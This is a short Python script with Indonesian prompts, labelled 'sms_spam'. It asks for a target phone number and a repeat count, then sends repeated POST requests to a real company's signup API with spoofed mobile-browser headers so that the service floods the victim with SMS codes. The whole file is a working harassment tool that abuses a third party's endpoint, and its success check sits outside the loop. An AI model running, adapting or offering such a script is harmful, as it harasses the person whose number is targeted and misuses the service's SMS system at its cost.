import requests, json, os

os.system("clear")
print("sms_spam Ready!!")
nomor = input("Masukkan nomor Target > ")
jumlah = int(input("Masukkan jumlah spam > "))

headers = {
"Host": "eci.id",
"Connection": "keep-alive",
"Content-Length": "40",
"sec-ch-ua": "Google Chrome=107, Chromium;v=107, Not=A?Brand;v=24",
"Accept": "application/json, text/plain, */*",
"Content-Type": "application/json",
"sec-ch-ua-mobile": "?1",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
"sec-ch-ua-platform": "Android",
"Origin": "https://eci.id",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://eci.id/register",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}

data = json.dumps({"identity":"0"+nomor})
for i in range(jumlah):

    pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text
if "success" in pos:
    print("spam sms Berhasil!!")
else:
    print("spam sms Gagal!!")
